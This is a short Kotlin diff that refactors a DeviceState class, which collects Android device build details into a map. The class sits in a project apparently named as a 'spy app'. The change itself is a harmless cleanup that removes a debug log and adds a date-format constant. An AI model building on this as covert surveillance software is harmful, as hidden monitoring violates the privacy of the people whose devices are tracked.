@@ -1,7 +1,6 @@
 package com.komnacki.androidspyapp.device.device
 
 import android.content.Context
-import android.util.Log
 import com.komnacki.androidspyapp.Message
 import github.nisrulz.easydeviceinfo.base.EasyDeviceMod
 import java.text.SimpleDateFormat
@@ -10,13 +9,13 @@ import java.text.SimpleDateFormat
 class DeviceState(override var context: Context) :
     Message {
     init {
-        Log.d("KK: ", "DeviceState")
         getDeviceState(
             context
         )
     }
 
     companion object {
+        private const val DATE_PATERN: String = "yyyy-MM-dd"
         private val info: MutableMap<String, Any> = mutableMapOf()
 
         fun getDeviceState(context: Context) {
@@ -48,7 +47,7 @@ class DeviceState(override var context: Context) :
             info["BUILD_BRAND"] = easyDeviceMod.buildBrand
             info["BUILD_HOST"] = easyDeviceMod.buildHost
             info["BUILD_TAGS"] = easyDeviceMod.buildTags
-            info["BUILD_TIME"] = SimpleDateFormat("yyyy-MM-dd").format(easyDeviceMod.buildTime).toString()
+            info["BUILD_TIME"] = SimpleDateFormat(DATE_PATERN).format(easyDeviceMod.buildTime).toString()
             info["BUILD_VERSION_RELEASE"] = easyDeviceMod.buildVersionRelease
         }
     }
